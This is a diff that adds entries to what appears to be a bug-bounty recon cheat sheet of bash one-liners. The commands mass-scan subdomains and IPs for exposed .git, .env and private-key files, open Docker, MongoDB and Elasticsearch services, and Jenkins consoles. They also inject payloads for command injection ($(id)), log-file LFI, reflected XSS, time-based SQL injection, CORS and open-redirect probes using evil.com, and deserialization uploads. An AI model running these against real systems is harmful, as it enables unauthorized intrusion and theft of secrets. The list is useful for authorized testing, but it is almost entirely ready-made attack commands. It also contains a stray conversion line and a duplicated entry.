@@ -1535,4 +1535,116 @@ cat urls.txt | qsreplace '../../../../../../../../var/log/nginx/access.log' | ht
 ```bash
 cat subdomains.txt | httpx -silent -path /script -mc 200 -o exposed_jenkins.txt
 ```
+Here’s the converted content:
+
+📂  Exposed Git Directories (Sensitive Files in .git)
+```bash
+cat subdomains.txt | httpx -silent -path /.git/config -mc 200 -o exposed_git.txt
+```
+
+🔥  Open Kibana (Cloud Misconfiguration)
+```bash
+cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o open_kibana.txt
+```
+
+📤  Exposed Env Files (Secrets Disclosure)
+```bash
+cat subdomains.txt | httpx -silent -path /.env -mc 200 -o exposed_env.txt
+```
+
+🗂️  Directory Listing Enabled (Info Disclosure)
+```bash
+cat subdomains.txt | httpx -silent -path / -fr 'Index of /' -o dir_listing.txt
+```
+
+💉  Command Injection via Input Parameters
+```bash
+cat urls.txt | qsreplace '$(id)' | httpx -silent -fr 'uid=' -o command_injection.txt
+```
+
+🪄  CORS Misconfiguration Check (Origin Reflection)
+```bash
+cat urls.txt | httpx -silent -H 'Origin: https://evil.com' -fr 'https://evil.com' -o cors_misconfig.txt
+```
+
+🔗  Open Redirect (URL Parameter Test)
+```bash
+cat urls.txt | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirect.txt
+```
+
+Backup/Old Files Exposure
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/index.php~\n/config.old\n/database.bak') -mc 200 -o exposed_backup_files.txt
+```
+
+🕵️  Clickjacking (Missing X-Frame-Options)
+```bash
+cat subdomains.txt | httpx -silent -hx -o headers.txt
+cat headers.txt | grep -E "x-frame-options|X-Frame-Options" -i -L > clickjacking_vulnerable.txt
+```
+
+⚙️  Misconfigured Jenkins Instances
+```bash
+cat subdomains.txt | httpx -silent -path /script -mc 200 -o exposed_jenkins.txt
+```
+
+💾  Open MongoDB Instances (Cloud Exposure)
+```bash
+cat ips.txt | xargs -I{} sh -c 'echo {} && mongosh --host {} --eval "db.stats()"' 2>/dev/null | tee open_mongodb.txt
+```
+
+Exposed Private Keys (Accidental Disclosure)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/id_rsa\n/keys/privkey.pem\n/.ssh/id_rsa') -mc 200 -o exposed_keys.txt
+```
+
+Insecure JSONP Endpoints (Callback Hijacking)
+```bash
+cat urls.txt | qsreplace 'callback=alert(document.domain)' | httpx -silent -fr 'alert(document.domain)' -o jsonp_vulns.txt
+```
+
+Exposed phpinfo() Files (Info Disclosure)
+```bash
+cat subdomains.txt | httpx -silent -path /phpinfo.php -mc 200 -o exposed_phpinfo.txt
+```
+
+RCE via Deserialization (Java/PHP Payloads)
+```bash
+cat upload_urls.txt | xargs -I{} curl -X POST -F 'file=@payload.ser' {} -s | grep 'java.lang.Runtime' -o rce_found.txt
+```
+
+LFI via Log Files
+```bash
+cat urls.txt | qsreplace '../../../../../../../../var/log/nginx/access.log' | httpx -silent -fr 'GET /' -o log_lfi.txt
+```
+
+Exposed Docker APIs (DevOps Misconfig)
+```bash
+cat ips.txt | xargs -I{} curl -s -X GET "http://{}:2375/images/json" | grep 'Id' -B 2 | tee exposed_docker.txt
+```
+
+Amazon S3 Buckets (Open Buckets)
+```bash
+cat subdomains.txt | sed 's/$/.s3.amazonaws.com/' | httpx -silent -mc 200 -o open_s3_buckets.txt
+```
+
+Open Elasticsearch (DevOps Exposure)
+```bash
+cat ips.txt | xargs -I{} curl -s "http://{}:9200/_cat/indices?v" | grep -v 'master' | tee open_elasticsearch.txt
+```
+
+Backup Files in Web Root
+```bash
+cat urls.txt | sed 's/$/.bak/' | httpx -silent -mc 200 -o found_backups.txt
+```
+
+XSS in reflected parameters (quick check)
+```bash
+cat urls.txt | qsreplace '<script>alert(1)</script>' | httpx -silent -fr '<script>alert(1)</script>' -o xss_reflected.txt
+```
+
+SQL Injection (time-based detection)
+```bash
+cat urls.txt | qsreplace "' AND SLEEP(5)--" | httpx -silent -rt -o sqli_time_based.txt
+```
 
